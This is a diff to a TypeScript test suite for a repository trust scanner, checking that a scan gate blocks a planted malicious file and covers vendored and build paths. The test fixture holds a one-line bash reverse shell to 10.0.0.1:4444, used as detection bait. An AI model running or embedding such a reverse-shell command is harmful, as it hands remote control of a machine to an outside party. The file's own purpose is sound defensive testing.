@@ -1,4 +1,5 @@
 import { execFileSync } from "node:child_process";
+import { createHash } from "node:crypto";
 import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
@@ -16,6 +17,7 @@ import {
   type TrustFileInventory,
 } from "../../src/trust/inventory.js";
 import { hermeticGitEnv } from "../git-fixture-env.js";
+import { fakeBindingGateScan, selectedPathsOf } from "./fake-binding-gate.js";
 
 const REVERSE_SHELL = "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n";
 
@@ -41,6 +43,10 @@ function initGitRepo(files: Record<string, string>): void {
   git(repoDir, ["commit", "-m", "init"]);
 }
 
+function sha256(text: string): string {
+  return createHash("sha256").update(text.replace(/\r\n/g, "\n"), "utf8").digest("hex");
+}
+
 async function resolve(): Promise<ResolvedGitSource> {
   return resolveGitSource(
     { repository: repoDir, ref: "HEAD" },
@@ -64,13 +70,37 @@ describe("scan covers the exact resolved digest (CM-27 / D7)", () => {
       const resolved = await resolve();
       // The payload path is folded into the identity digest.
       expect(resolved.files).toContain(`${skipped}/evil.sh`);
+      // Scan reports the payload only when Core actually sent it, so the block
+      // proves Core inspected the path the digest pins.
+      const payload = `${skipped}/evil.sh`;
+      const scan = fakeBindingGateScan((selected) =>
+        selected.includes(payload)
+          ? [
+              {
+                dimension: "suspicious-execution",
+                status: "produced",
+                findings: [
+                  {
+                    code: "trust.reverse-shell",
+                    severity: "critical",
+                    detail: "reverse shell",
+                    coverage: "complete",
+                    path: payload,
+                    contentSha256: sha256(REVERSE_SHELL),
+                  },
+                ],
+              },
+            ]
+          : [],
+      );
       // vibe + allowIncompleteAtVibe isolates the danger floor from coverage: the
       // block must come from the now-inspected malicious shape, not incompleteness.
-      const disposition = runFastScanGate(
+      const disposition = await runFastScanGate(
         scannableFromGit(resolved),
         { posture: "vibe", allowIncompleteAtVibe: true },
-        { cacheHome },
+        { cacheHome, scanExecution: scan },
       );
+      expect(selectedPathsOf(scan.requests[0] ?? {})).toContain(payload);
       expect(disposition.verdict).toBe("block");
       expect(disposition.findings.some((f) => f.severity === "critical")).toBe(true);
     });
@@ -90,18 +120,14 @@ describe("scan covers the exact resolved digest (CM-27 / D7)", () => {
       };
     };
     const src = scannableFromGit(resolved);
+    const deps = { cacheHome, inventoryFactory: dropping, scanExecution: fakeBindingGateScan() };
 
-    expect(
-      runFastScanGate(src, { posture: "enterprise" }, { cacheHome, inventoryFactory: dropping })
-        .verdict,
-    ).toBe("block");
-    expect(
-      runFastScanGate(src, { posture: "vibe" }, { cacheHome, inventoryFactory: dropping }).verdict,
-    ).toBe("block");
-    const allowed = runFastScanGate(
+    expect((await runFastScanGate(src, { posture: "enterprise" }, deps)).verdict).toBe("block");
+    expect((await runFastScanGate(src, { posture: "vibe" }, deps)).verdict).toBe("block");
+    const allowed = await runFastScanGate(
       src,
       { posture: "vibe", allowIncompleteAtVibe: true },
-      { cacheHome, inventoryFactory: dropping },
+      deps,
     );
     expect(allowed.verdict).toBe("allow");
     expect(allowed.findings.some((f) => f.coverage === "incomplete")).toBe(true);
@@ -114,16 +140,17 @@ describe("scan covers the exact resolved digest (CM-27 / D7)", () => {
     // pinned digest; production always supplies it via scannableFromGit, so this
     // guards any future caller that constructs a ScannableSource directly.
     const noIdentity = { digest: resolved.treeDigest, treePath: resolved.treePath };
-    expect(runFastScanGate(noIdentity, { posture: "enterprise" }, { cacheHome }).verdict).toBe(
+    const deps = { cacheHome, scanExecution: fakeBindingGateScan() };
+    expect((await runFastScanGate(noIdentity, { posture: "enterprise" }, deps)).verdict).toBe(
       "block",
     );
-    expect(runFastScanGate(noIdentity, { posture: "vibe" }, { cacheHome }).verdict).toBe("block");
+    expect((await runFastScanGate(noIdentity, { posture: "vibe" }, deps)).verdict).toBe("block");
     // Warming the cache with a correct source for the SAME digest must not let an
     // identity-less source ride that cache entry to an allow.
     expect(
-      runFastScanGate(scannableFromGit(resolved), { posture: "enterprise" }, { cacheHome }).verdict,
+      (await runFastScanGate(scannableFromGit(resolved), { posture: "enterprise" }, deps)).verdict,
     ).toBe("allow");
-    expect(runFastScanGate(noIdentity, { posture: "enterprise" }, { cacheHome }).verdict).toBe(
+    expect((await runFastScanGate(noIdentity, { posture: "enterprise" }, deps)).verdict).toBe(
       "block",
     );
   });
@@ -136,10 +163,15 @@ describe("scan covers the exact resolved digest (CM-27 / D7)", () => {
       "dist/out.js": "export const y = 2;\n",
     });
     const resolved = await resolve();
-    const disposition = runFastScanGate(
+    const scan = fakeBindingGateScan();
+    const disposition = await runFastScanGate(
       scannableFromGit(resolved),
       { posture: "enterprise" },
-      { cacheHome },
+      { cacheHome, scanExecution: scan },
+    );
+    // Core sent the vendored/build bytes the digest pins; nothing was left uninspected.
+    expect(selectedPathsOf(scan.requests[0] ?? {})).toEqual(
+      expect.arrayContaining(["node_modules/dep/index.js", "dist/out.js"]),
     );
     expect(disposition.verdict).toBe("allow");
     expect(disposition.findings.every((f) => f.coverage === "complete")).toBe(true);
